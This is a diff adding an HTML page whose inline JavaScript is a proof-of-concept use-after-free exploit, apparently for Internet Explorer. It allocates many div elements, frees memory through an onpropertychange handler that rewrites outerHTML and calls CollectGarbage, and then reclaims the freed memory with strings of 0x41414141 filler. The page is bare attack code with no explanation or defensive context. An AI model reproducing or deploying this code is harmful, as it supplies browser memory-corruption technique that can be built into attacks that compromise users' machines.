@@ -1,0 +1,47 @@
+<html>
+<head id="headId">
+<title>main page</title>
+<script>
+function dword2data(dword) {
+    var d = Number(dword).toString(16);
+    while (d.length < 8)
+        d = '0' + d;
+    return unescape('%u' + d.substr(4, 8) + '%u' + d.substr(0, 4));
+}
+
+var g_arr = [];
+var arrLen = 0x250;
+
+function fun()
+{
+    var a=0;
+    // to alloc the memory
+    for(a=0;a<arrLen;++a)
+    {
+        g_arr[a]=document.createElement('div')
+    };
+
+    var b = dword2data(0x41414141);
+    while(b.length<0x360) b += dword2data(0x41414141);
+    var d=b.substring(0,(0x340-2)/2);
+    try{
+        this.outerHTML=this.outerHTML
+    } catch(e){}
+    CollectGarbage();
+    //to reuse the freed memory
+    for(a=0;a<arrLen;++a)
+    {
+        g_arr[a].title=d.substring(0,d.length);
+    }
+}
+function puIHa3() {
+    var a = document.getElementsByTagName("script");
+    var b = a[0];
+    b.onpropertychange = fun ;
+    var c = document.createElement('SELECT');
+    c = b.appendChild(c);//
+}
+puIHa3();
+</script>
+</head>
+</html>
